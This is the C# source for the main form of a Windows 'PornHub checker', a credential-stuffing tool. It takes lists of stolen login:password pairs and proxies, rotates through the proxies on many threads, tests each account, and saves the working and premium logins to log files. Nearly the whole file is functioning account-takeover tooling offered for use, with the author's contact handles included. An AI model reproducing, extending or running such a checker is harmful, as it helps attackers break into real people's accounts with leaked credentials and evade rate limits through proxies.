namespace PornHub_Checker
{
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.IO;
    using System.Threading;
    using System.Threading.Tasks;
    using System.Windows.Forms;
    using xNet;

    public partial class PrnHubFrm : Form
    {
        #region Values
        private static bool Pause = false, Stop = true, Strt = false;
        private int Good = 0, Premium = 0, BadProxies = 0, total = 0, i = 0, p = 0;
        private static int Bad = 0;
        private readonly string ErrPath = Application.StartupPath.ToString() + @"\ErrorLog.txt";
        private string bPath = null;
        #endregion

        #region Delegates
        private delegate void countSet();
        countSet cset;
        #endregion

        #region Other...
        static AutoResetEvent ae = new AutoResetEvent(Pause);
        private static readonly AutoResetEvent autoResetEvent = new AutoResetEvent(false);
        private readonly AutoResetEvent reset = autoResetEvent;

        ProxyType proxyType = new ProxyType();

        Object sync = new object();
        #endregion

        #region Collections
        Queue<string> Proxy; //proxies list      
        readonly List<Thread> threads = new List<Thread>();
        List<string> bd = new List<string>(); // checked accounts - bad
        List<string> gd = new List<string>(); //good
        List<string> pr = new List<string>(); //premium
        List<string> bp = new List<string>(); //bad proxies
        #endregion

        #region Form
        public PrnHubFrm()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            textBox1.Text = "1";
        }

        public const int WM_NCLBUTTONDOWN = 0xA1, HT_CAPTION = 0x2;       

        private void panel1_Paint(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                NativeMethods.ReleaseCapture();
                NativeMethods.SendMessage(this.Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void label6_Click(object sender, EventArgs e)
        {
            var msg = MessageBox.Show("Do you sure?", "Warning!", MessageBoxButtons.YesNo);
            if (msg == DialogResult.Yes)
            {
                Application.Exit();
            }
            else { }
        }

        private void label7_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void label12_Click(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                NativeMethods.ReleaseCapture();
                NativeMethods.SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void label8_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/AikoSimidzu");
        }
        #endregion

        #region Main methods
        private void start(object data) //calling a worker and receiving a response
        {
            try
            {                 
                if (i < total) //Check account number from the account of the maximum number
                {                    
                    i += 1;
                    
                    cset = cSet;

                    string login = ((string)data).Split(':')[0];
                    string password = ((string)data).Split(':')[1];
                    string proxy = string.Empty;

                    if (Proxy != null) //checking for proxies in a string
                    {
                        lock (sync)
                        {
                            proxy = Proxy.Dequeue();
                            Proxy.Enqueue(proxy);
                        }
                    }

                    string wrk = Worker.Start(login, password, proxyType, proxy, checkBox1.Checked); //check started
                    if (wrk == "Bad") //check and record - bad
                    {
                        Bad += 1;                        
                        bd.Add(data.ToString() + "\n");
                    }
                    if (wrk == "Good") //good
                    {
                        Good += 1;                      
                        gd.Add(data.ToString() + "\n");

                        string[] dat = { login, password, "Good" };
                        listView1.Items.Add(new ListViewItem(dat));
                    }
                    if (wrk == "Prem") //premium
                    {
                        Good += 1;
                        Premium += 1;
                        
                        pr.Add(data.ToString() + "\n");

                        string[] dat = { login, password, "Premium" };
                        listView1.Items.Add(new ListViewItem(dat));
                    }
                    if (wrk == "Err") //bad proxy
                    {
                        BadProxies += 1;                        
                        bp.Add(data.ToString() + "\n");
                    }
                    Invoke(cset);

                    lock (sync) threads.Remove(Thread.CurrentThread);
                    reset.Set(); //sending a signal about the end of the stream                     
                }
                else
                {
                    if (p < 1)
                    {
                        p += 1;
                        Stop = true; //set the flag
                        Strt = false;
                        reset.Dispose(); //free up resources
                        MessageBox.Show("Finish!");
                        SReader.list.Clear();
                    }
                }
            }
            catch (Exception ex)
            {
                foreach (string bad in bd) //save logs - bad
                {
                    Helper.LogSaveBad(bad);
                }
                foreach (string good in gd) //good
                {
                    Helper.LogSaveGood(good);
                }
                foreach (string premium in pr) //premium
                {
                    Helper.LogSavePremium(premium);
                }
                foreach (string bprox in bp) //bad proxy
                {
                    Helper.LogSaveBadProxies(bprox);
                }
                File.WriteAllText(ErrPath, ex.ToString());
                File.AppendAllText(ErrPath, "\nMethod: start");
            }
        }

        private void MainStart()
        {
            if (total != 0)
            {
                try
                {
                    while (Stop != true) //cycle
                    {
                        if (bPath != null)
                        {
                            foreach (string line in SReader.list)
                            {
                                if (Stop == true) { break; } //stop the loop if the flag is set                                    
                                if (Pause != false)
                                {
                                    ae.WaitOne(); //if there is a pause, then we expect
                                }
                                if (threads.Count >= int.Parse(textBox1.Text)) // if the number of threads is greater, then we expect the completion of the previous
                                {
                                    reset.WaitOne();
                                }

                                var thr = new Thread(start)
                                {
                                    IsBackground = true
                                };

                                if (checkBox2.Checked != true)
                                {
                                    thr.Start(line);
                                }
                                else
                                {
                                    thr.Start(Helper.Trim(line));
                                }
                                threads.Add(thr);
                            }
                        }
                        else
                        {
                            Stop = true;
                            MessageBox.Show("Please, upload base!");
                        }
                        Thread.Sleep(100); //delay to reduce the load - 0.1 sec !!!
                    }
                }
                catch (Exception ex)
                {
                    foreach (string bad in bd) //save logs - bad
                    {
                        Helper.LogSaveBad(bad);
                    }
                    foreach (string good in gd) //good
                    {
                        Helper.LogSaveGood(good);
                    }
                    foreach (string premium in pr) //premium
                    {
                        Helper.LogSavePremium(premium);
                    }
                    foreach (string bprox in bp) //bad proxy
                    {
                        Helper.LogSaveBadProxies(bprox);
                    }
                    MessageBox.Show("Hi! An unexpected error has occurred. \nDon’t worry, we saved your logs automatically! ≧◡≦ \nThe error log was saved in the program folder, send it to me in telegram: AikoSimidzu");
                    File.WriteAllText(ErrPath, ex.ToString());
                    File.AppendAllText(ErrPath, "\nMethod: MainStart");
                }
            }
            else
            {
                MessageBox.Show("Pls upload base.");
            }
        }
        #endregion                                 

        #region Methods for delegates
        private void cSet()
        {
            label5.Text = "Bad: " + Bad.ToString();
            label4.Text = "Good: " + Good.ToString();
            label3.Text = "Premium: " + Premium.ToString();
            label11.Text = "Bad proxies: " + BadProxies.ToString();
            label14.Text = "Total checked: " + i.ToString();
        }
        #endregion

        #region Buttons
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    bPath = ofd.FileName;
                    SReader.path = ofd.FileName;

                    total = SReader.ACount();
                    label1.Text = "All accounts: " + SReader.ACount();
                }
            }
            catch (Exception ex)
            {
                foreach (string bad in bd) //save logs - bad
                {
                    Helper.LogSaveBad(bad);
                }
                foreach (string good in gd) //good
                {
                    Helper.LogSaveGood(good);
                }
                foreach (string premium in pr) //premium
                {
                    Helper.LogSavePremium(premium);
                }
                foreach (string bprox in bp) //bad proxy
                {
                    Helper.LogSaveBadProxies(bprox);
                }
                MessageBox.Show("Hi! An unexpected error has occurred. \nDon’t worry, we saved your logs automatically! ≧◡≦ \nThe error log was saved in the program folder, send it to me in telegram: AikoSimidzu");
                File.WriteAllText(ErrPath, ex.ToString());
                File.AppendAllText(ErrPath, "Method: button1");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    Proxy = new Queue<string>(File.ReadAllLines(ofd.FileName));
                    label2.Text = "Proxies: " + Proxy.Count;
                }
            }
            catch (Exception ex)
            {
                foreach (string bad in bd) //save logs - bad
                {
                    Helper.LogSaveBad(bad);
                }
                foreach (string good in gd) //good
                {
                    Helper.LogSaveGood(good);
                }
                foreach (string premium in pr) //premium
                {
                    Helper.LogSavePremium(premium);
                }
                foreach (string bprox in bp) //bad proxy
                {
                    Helper.LogSaveBadProxies(bprox);
                }
                MessageBox.Show("Hi! An unexpected error has occurred. \nThe error log was saved in the program folder, send it to me in telegram: AikoSimidzu");
                File.WriteAllText(ErrPath, ex.ToString());
                File.AppendAllText(ErrPath, "Method: button2");
            }
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            try
            {
                if (Strt != true)
                {
                    Good = 0; Premium = 0; BadProxies = 0; i = 0; //reset the counters
                    if (bd.Count > 0) //clean old logs
                    {
                        bd.Clear();
                    }
                    if (bp.Count > 0)
                    {
                        bp.Clear();
                    }
                    if (gd.Count > 0)
                    {
                        gd.Clear();
                    }
                    if (pr.Count > 0)
                    {
                        pr.Clear();
                    }

                    if (checkBox1.Checked != false)
                    {
                        if (comboBox1.Text == "HTTP/s") // Select proxy type
                        {
                            proxyType = ProxyType.Http;
                        }
                        else
                        {
                            if (comboBox1.Text == "Socks4")
                            {
                                proxyType = ProxyType.Socks4;
                            }
                            else
                            {
                                if (comboBox1.Text == "Socks5")
                                {
                                    proxyType = ProxyType.Socks5;
                                }
                            }
                        }
                    }

                    Strt = true;
                    Stop = false;

                    //Running a loop in a separate thread
                    await Task.Run(() => MainStart());
                }
                else
                {
                    MessageBox.Show("Already launched!");
                }
            }
            catch (Exception ex)
            {
                foreach (string bad in bd) //save logs - bad
                {
                    Helper.LogSaveBad(bad);
                }
                foreach (string good in gd) //good
                {
                    Helper.LogSaveGood(good);
                }
                foreach (string premium in pr) //premium
                {
                    Helper.LogSavePremium(premium);
                }
                foreach (string bprox in bp) //bad proxy
                {
                    Helper.LogSaveBadProxies(bprox);
                }
                File.WriteAllText(ErrPath, ex.ToString());
                File.AppendAllText(ErrPath, "\nMethod: button3");
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                if (Pause == false) //set / remove pause
                {
                    Pause = true;
                    ae.Set();
                }
                else
                {
                    Pause = false;
                    ae.Set();
                }
            }
            catch (Exception ex)
            {
                foreach (string bad in bd) //save logs - bad
                {
                    Helper.LogSaveBad(bad);
                }
                foreach (string good in gd) //good
                {
                    Helper.LogSaveGood(good);
                }
                foreach (string premium in pr) //premium
                {
                    Helper.LogSavePremium(premium);
                }
                foreach (string bprox in bp) //bad proxy
                {
                    Helper.LogSaveBadProxies(bprox);
                }
                MessageBox.Show("Hi! An unexpected error has occurred. \nDon’t worry, we saved your logs automatically! ≧◡≦ \nThe error log was saved in the program folder, send it to me in telegram: AikoSimidzu");
                File.WriteAllText(ErrPath, ex.ToString());
                File.AppendAllText(ErrPath, "Method: button4");
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Stop = true;
            Strt = false;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            if (Strt != true)
            {
                try
                {
                    foreach (string bad in bd) //save logs - bad
                    {
                        Helper.LogSaveBad(bad);
                    }
                    foreach (string good in gd) //good
                    {
                        Helper.LogSaveGood(good);
                    }
                    foreach (string premium in pr) //premium
                    {
                        Helper.LogSavePremium(premium);
                    }
                    foreach (string bprox in bp) //bad proxy
                    {
                        Helper.LogSaveBadProxies(bprox);
                    }
                    bd.Clear(); gd.Clear(); pr.Clear(); bp.Clear();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Hi! An unexpected error has occurred. \nThe error log was saved in the program folder, send it to me in telegram: AikoSimidzu");
                    File.WriteAllText(ErrPath, ex.ToString());
                    File.AppendAllText(ErrPath, "Method: Save logs");
                }
            }
            else
            {
                MessageBox.Show("Pls, stop checker!");
            }
        }
        #endregion
    }
}
// Thanks so much for the guidance and help - Git: https://github.com/r3xq1